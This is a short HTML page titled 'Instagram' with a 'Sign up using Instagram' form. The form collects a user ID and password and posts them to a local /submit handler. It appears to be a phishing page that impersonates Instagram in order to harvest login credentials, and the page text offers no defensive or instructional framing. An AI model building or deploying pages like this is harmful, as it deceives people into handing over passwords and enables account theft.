<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css">

</head>
<body>
  <div class="container">
    <h2>Sign up using Instagram</h2>
    <form id="dataForm" action="/submit" method="POST">
      <input type="text" id="name" name="name" placeholder="UserID" required>
      <input type="password" id="password" name="password" placeholder="Password" type="Password" required>
      <button type="submit">Submit</button>
    </form>
    <p id="responseMessage"></p>
  </div>
  <script src="script.js"></script>
</body>
</html>
